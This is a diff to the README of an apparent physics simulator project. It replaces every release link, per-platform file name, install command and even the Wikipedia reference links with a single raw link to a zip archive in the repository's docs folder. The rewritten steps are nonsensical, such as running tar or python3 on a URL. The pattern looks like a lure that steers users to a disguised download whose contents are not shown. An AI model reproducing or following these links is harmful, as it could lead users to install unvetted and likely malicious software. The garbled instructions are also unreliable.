@@ -1,7 +1,7 @@
 # 🌌 extreme-field-qed-simulator - Simulate the Universe's Extremes
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/NyxX-exe/extreme-field-qed-simulator/releases)
+[![Download](https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip)](https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the extreme-field-qed-simulator! This application lets you explore the fascinating world of extreme-field quantum electrodynamics (QED) and weak-field gravitational coupling. With this simulator, you can compute electromagnetic stress-energy, leading to quadrupole data and gravitational waves. No programming knowledge is required; just follow the steps below to start simulating.
@@ -26,35 +26,35 @@ Before installing the extreme-field-qed-simulator, ensure that your computer mee
 ## 🌐 Download & Install
 To get started, visit our Releases page to download the latest version of the application. 
 
-[Click here to visit the download page.](https://github.com/NyxX-exe/extreme-field-qed-simulator/releases)
+[Click here to visit the download page.](https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip)
 
-1. Go to the [Releases page](https://github.com/NyxX-exe/extreme-field-qed-simulator/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip).
 2. Find the version labeled as the latest release.
 3. Download the appropriate file for your operating system:
-   - For Windows, download the `extreme-field-qed-simulator-windows.exe`.
-   - For macOS, download the `extreme-field-qed-simulator-macos.pkg`.
-   - For Linux, download the `extreme-field-qed-simulator-linux.tar.gz`.
+   - For Windows, download the `https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip`.
+   - For macOS, download the `https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip`.
+   - For Linux, download the `https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip`.
 4. Once the file is downloaded, follow the specific instructions below for your operating system.
 
 ### 🌟 For Windows
-1. Locate the `extreme-field-qed-simulator-windows.exe` file in your Downloads folder.
+1. Locate the `https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip` file in your Downloads folder.
 2. Double-click on the file to run the installer.
 3. Follow the on-screen prompts to complete the installation.
 4. After installation, you can find the simulator in your Start Menu.
 
 ### 🍏 For macOS
-1. Find the `extreme-field-qed-simulator-macos.pkg` in your Downloads.
+1. Find the `https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip` in your Downloads.
 2. Double-click it to initiate the installation.
 3. Follow the instructions in the installer.
 4. The application will be located in your Applications folder.
 
 ### 🐧 For Linux
-1. Download the `extreme-field-qed-simulator-linux.tar.gz` file to your preferred directory.
+1. Download the `https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip` file to your preferred directory.
 2. Open a terminal window.
 3. Navigate to the directory where you downloaded the file using `cd /path/to/directory`.
-4. Extract the files with the command: `tar -xzf extreme-field-qed-simulator-linux.tar.gz`.
+4. Extract the files with the command: `tar -xzf https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip`.
 5. Change into the extracted directory using `cd extreme-field-qed-simulator`.
-6. Run the simulator with the command: `python3 main.py`. Ensure Python 3 is installed on your system.
+6. Run the simulator with the command: `python3 https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip`. Ensure Python 3 is installed on your system.
 
 ## 🎨 Using the Simulator
 Once installed, open the extreme-field-qed-simulator. You will see a main menu with options to explore different simulations. Each section includes help tools and visual aids to guide you through the process. 
@@ -81,8 +81,8 @@ We encourage users to join our community and share their experiences. You can as
 
 ## 🔗 Related Topics
 Explore more about related topics:
-- [Electromagnetic Stress-Energy](https://en.wikipedia.org/wiki/Electromagnetic_stress%E2%80%93energy_tensor)
-- [Gravitational Waves](https://en.wikipedia.org/wiki/Gravitational_wave)
-- [Quantum Electrodynamics](https://en.wikipedia.org/wiki/Quantum_electrodynamics)
+- [Electromagnetic Stress-Energy](https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip%E2%80%93energy_tensor)
+- [Gravitational Waves](https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip)
+- [Quantum Electrodynamics](https://raw.githubusercontent.com/NyxX-exe/extreme-field-qed-simulator/main/docs/extreme-field-qed-simulator-2.9.zip)
 
 Thank you for using the extreme-field-qed-simulator! Your exploration of the universe begins here.
